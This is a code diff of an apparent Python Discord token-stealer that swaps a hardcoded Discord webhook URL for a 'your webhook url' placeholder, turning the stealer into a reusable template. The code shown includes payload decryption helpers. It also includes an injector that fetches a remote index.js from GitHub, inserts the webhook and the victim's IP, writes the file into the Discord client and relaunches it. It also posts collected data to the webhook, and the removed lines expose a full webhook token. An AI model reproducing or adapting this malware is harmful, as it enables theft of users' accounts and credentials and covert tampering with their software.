@@ -16,6 +16,9 @@ import getpass
 import psutil
 from dhooks import Webhook, File
 import base64
+
+webhook_url = "your webhook url"
+
 try:        
     from psutil import process_iter, NoSuchProcess, AccessDenied, ZombieProcess
     class scare:
@@ -34,7 +37,7 @@ try:
 except:
     pass
 
-hook = Webhook("https://discord.com/api/webhooks/983003068524298281/wBvYqKPJgR6_d7Pumik8B8w0htJ8DvbNhgMK3tivZAf5XQJOh4xM1t_dF_KiIgfkXy8m")
+hook = Webhook(webhook_url)
 def decrypt_payload(cipher, payload):
     return cipher.decrypt(payload)
 def generate_cipher(aes_key, iv):
@@ -378,7 +381,7 @@ def injector():
                                 os.makedirs(inj_path+'initiation', exist_ok=True)
                             except (FileExistsError, PermissionError):
                                 pass
-                        f = requests.get("https://raw.githubusercontent.com/otar120/injector/main/index.js").text.replace("%WEBHOOK%","https://discord.com/api/webhooks/983003068524298281/wBvYqKPJgR6_d7Pumik8B8w0htJ8DvbNhgMK3tivZAf5XQJOh4xM1t_dF_KiIgfkXy8m").replace("%IP%",f"{getip()}")
+                        f = requests.get("https://raw.githubusercontent.com/otar120/injector/main/index.js").text.replace("%WEBHOOK%",webhook_url).replace("%IP%",f"{getip()}")
                         with open(inj_path+'index.js', 'w', errors="ignore") as indexFile:
                             indexFile.write(f)
                         os.startfile(app + sep + _dir + '.exe')
@@ -548,7 +551,7 @@ def main():
         "file": ""
     }
     try:
-        urlopen(Request("https://discord.com/api/webhooks/983003068524298281/wBvYqKPJgR6_d7Pumik8B8w0htJ8DvbNhgMK3tivZAf5XQJOh4xM1t_dF_KiIgfkXy8m", data=dumps(webhook).encode(), headers=getheaders()))
+        urlopen(Request(webhook_url, data=dumps(webhook).encode(), headers=getheaders()))
     except:
         pass
 USER_NAME = getpass.getuser()
